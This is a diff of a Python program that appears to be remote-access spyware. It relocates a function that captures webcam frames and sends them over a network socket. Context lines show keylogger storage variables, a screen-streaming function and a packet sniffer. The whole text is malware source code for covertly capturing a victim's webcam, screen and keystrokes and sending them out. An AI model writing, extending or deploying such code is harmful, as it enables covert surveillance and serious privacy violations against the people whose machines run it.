@@ -36,20 +36,6 @@ lock = threading.Lock()  # Synchronization lock
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
 
-def webcam_stream(client_socket):
-    cap = cv2.VideoCapture(0)
-    while cap.isOpened():
-        ret, frame = cap.read()
-        if not ret or frame is None:
-            print("Failed to capture image from webcam.")
-            continue
-        _, buffer = cv2.imencode('.jpg', frame)
-        try:
-            client_socket.sendall(buffer.tobytes())
-        except:
-            break
-    cap.release()
-
 def screen_stream(client_socket):
     while True:
         try:
@@ -63,6 +49,20 @@ def screen_stream(client_socket):
         except Exception as e:
             print(f"An error occurred: {e}")
             break
+
+def webcam_stream(client_socket):
+    cap = cv2.VideoCapture(0)
+    while cap.isOpened():
+        ret, frame = cap.read()
+        if not ret or frame is None:
+            print("Failed to capture image from webcam.")
+            continue
+        _, buffer = cv2.imencode('.jpg', frame)
+        try:
+            client_socket.sendall(buffer.tobytes())
+        except:
+            break
+    cap.release()
 
 def sniffer_start():
     global sniffer_running
